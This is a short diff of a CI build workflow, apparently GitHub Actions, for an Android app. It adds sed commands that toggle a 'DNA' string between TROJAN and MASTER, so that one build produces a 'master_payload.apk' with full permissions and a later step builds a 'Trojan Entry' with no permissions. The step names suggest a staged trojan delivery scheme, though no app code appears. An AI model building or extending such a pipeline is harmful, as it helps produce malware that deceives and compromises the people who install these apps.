@@ -39,11 +39,17 @@ jobs:
 
       - name: Build Master Payload (Full Permissions)
         run: |
+          # Set DNA to MASTER
+          sed -i 's/TROJAN/MASTER/g' android/app/src/main/res/values/strings.xml
+          
           cd android
           chmod +x gradlew
           ./gradlew assembleDebug
           # MOVE TO ROOT SO IT DOES NOT GET DELETED BY NEXT BUILD
           cp app/build/outputs/apk/debug/app-debug.apk ../master_payload.apk
+          
+          # REVERT DNA TO TROJAN FOR NEXT BUILD
+          sed -i 's/MASTER/TROJAN/g' ../android/app/src/main/res/values/strings.xml
 
       - name: Build Trojan Entry (No Permissions)
         run: |
